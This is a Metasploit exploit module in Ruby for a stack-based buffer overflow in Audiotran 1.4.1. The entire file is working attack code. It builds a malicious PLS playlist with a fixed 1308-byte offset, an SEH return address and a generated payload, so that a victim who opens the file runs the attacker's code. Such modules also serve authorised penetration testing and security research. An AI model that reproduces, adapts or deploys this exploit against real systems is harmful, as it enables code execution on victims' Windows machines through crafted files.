require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
 Rank = GoodRanking

 include Msf::Exploit::FILEFORMAT
 include Msf::Exploit::Remote::Seh

 def initialize(info = {})
  super(update_info(info,
   'Name'           => 'Audiotran 1.4.1 (PLS File) Stack Overflow.',
   'Description'    => %q{
     This module exploits a stack-based buffer overflow in Audiotran 1.4.1.
     An attacker must send the file to victim and the victim must open the file.
     Alternatively it may be possible to execute code remotely via an embedded
     PLS file within a browser, when the PLS extention is registered to Audiotran.
     This functionality has not been tested in this module.
   },
   'License'        => MSF_LICENSE,
   'Author'   =>
    [
     'Sebastien Duquette',
     'dookie',
    ],
   'Version'        => '$Revision: 8091 $',
   'References'     =>
    [
     [ 'URL', 'http://www.exploit-db.com/exploits/11079' ],
    ],
   'Payload'        =>
    {
     'Space'    => 6000,
     'BadChars' => "\x00\x0a\x3d",
     'StackAdjustment' => -3500,
    },
   'Platform' => 'win',
   'Targets'        =>
    [
     [ 'Windows Universal', { 'Ret' => 0x10101A3E } ], #p/p/r in rsaadjd.tmp
    ],
   'Privileged'     => false,
   'DisclosureDate' => '09 Jan 2010',
   'DefaultTarget'  => 0))

   register_options(
    [
     OptString.new('FILENAME', [ true, 'The file name.',  'audiotran.pls']),
    ], self.class)

 end

 def exploit

  sploit = rand_text_alpha_upper(1308)
  sploit << generate_seh_payload(target.ret)
  sploit << rand_text_alpha_upper(8000)

  print_status("Creating '#{datastore['FILENAME']}' file ...")

  file_create(sploit)

 end

end